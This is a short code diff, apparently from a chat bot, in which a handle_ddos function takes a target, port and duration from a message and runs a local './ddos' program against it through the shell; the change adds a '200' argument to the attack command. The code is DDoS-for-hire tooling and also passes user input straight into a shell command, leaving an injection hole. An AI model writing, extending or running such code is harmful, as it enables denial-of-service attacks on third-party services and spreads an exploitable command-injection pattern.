@@ -19,7 +19,7 @@ def handle_ddos(message):
             response = "Error: Time interval must be less than 1000."
         else:
             start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-            full_command = f"./ddos {target} {port} {time}"
+            full_command = f"./ddos {target} {port} {time} 200"
             subprocess.run(full_command, shell=True)  # Run the command in the shell
             response = f"ddos Attack Finished. Target: {target} Port: {port} Time: {time} seconds."
     else:
